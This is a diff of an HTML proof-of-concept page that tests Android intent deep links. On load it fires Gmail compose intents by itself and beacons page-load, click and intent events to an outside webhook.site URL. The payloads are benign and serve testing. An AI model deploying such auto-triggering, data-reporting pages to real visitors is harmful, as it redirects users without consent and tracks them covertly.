@@ -2,14 +2,15 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Google Apps Intent PoC</title>
+<title>Gmail Intent Deep Link PoC</title>
 </head>
 <body>
-<h3>Intent PoC Running...</h3>
+<h3>Gmail Intent Test Running...</h3>
 
 <script>
 const WEBHOOK = "https://webhook.site/cc134afb-98c9-4219-8ed2-5b7fae0eafc0";
 
+// 🔥 logging reliable
 function report(data) {
     const payload = encodeURIComponent(JSON.stringify({
         time: Date.now(),
@@ -21,61 +22,78 @@ function report(data) {
     img.src = WEBHOOK + "?d=" + payload;
 }
 
-// 🎯 Target apps (Google only)
-const targets = [
+// 🎯 Gmail intent variations (safe testing)
+const intents = [
     {
-        app: "Gmail",
-        intent: "intent://compose?to=test@example.com#Intent;scheme=mailto;package=com.google.android.gm;end"
+        name: "basic_compose",
+        uri: "intent://compose?to=test@example.com#Intent;scheme=mailto;package=com.google.android.gm;end"
     },
     {
-        app: "Drive",
-        intent: "intent://open?id=123#Intent;scheme=https;package=com.google.android.apps.docs;end"
+        name: "with_subject",
+        uri: "intent://compose?to=test@example.com&subject=TEST_SUBJECT#Intent;scheme=mailto;package=com.google.android.gm;end"
     },
     {
-        app: "YouTube",
-        intent: "intent://watch?v=dQw4w9WgXcQ#Intent;scheme=https;package=com.google.android.youtube;end"
+        name: "with_body",
+        uri: "intent://compose?to=test@example.com&body=HELLO_TEST#Intent;scheme=mailto;package=com.google.android.gm;end"
     }
 ];
 
-// 🔥 Trigger satu per satu (biar tidak ketabrak)
-function runTests(index = 0) {
-    if (index >= targets.length) return;
-
-    const t = targets[index];
+// 🔥 run single test
+function runTest(intentObj, index) {
+    report({
+        event: "intent_attempt",
+        name: intentObj.name,
+        index
+    });
 
     try {
-        report({ app: t.app, event: "intent_attempt" });
-
-        // trigger intent
-        window.location.href = t.intent;
-
-        // fallback logging
-        setTimeout(() => {
-            report({ app: t.app, event: "intent_timeout" });
-            runTests(index + 1);
-        }, 3000);
-
+        window.location.href = intentObj.uri;
     } catch (e) {
-        report({ app: t.app, event: "intent_error" });
-        runTests(index + 1);
+        report({
+            event: "intent_error",
+            name: intentObj.name,
+            index
+        });
     }
+
+    // fallback timeout detection
+    setTimeout(() => {
+        report({
+            event: "intent_timeout",
+            name: intentObj.name,
+            index
+        });
+    }, 2500);
 }
 
-// 🔍 postMessage probe
-window.addEventListener("message", (evt) => {
-    report({
-        app: "GLOBAL",
-        event: "postMessage_received",
-        origin: evt.origin,
-        data: typeof evt.data
-    });
-}, false);
+// 🔥 sequential runner
+function runAll() {
+    let delay = 0;
 
+    intents.forEach((intentObj, i) => {
+        setTimeout(() => {
+            runTest(intentObj, i);
+        }, delay);
+
+        delay += 4000; // spacing biar tidak ketabrak
+    });
+}
+
+// 🔍 detect user interaction
+document.addEventListener("click", () => {
+    report({ event: "user_click_detected" });
+});
+
+// 🔥 auto trigger
 window.onload = () => {
-    runTests();
+    report({ event: "page_loaded" });
+
+    setTimeout(() => {
+        report({ event: "auto_trigger_start" });
+        runAll();
+    }, 1000);
 };
 </script>
 
-<p>Check webhook for logs.</p>
 </body>
 </html>
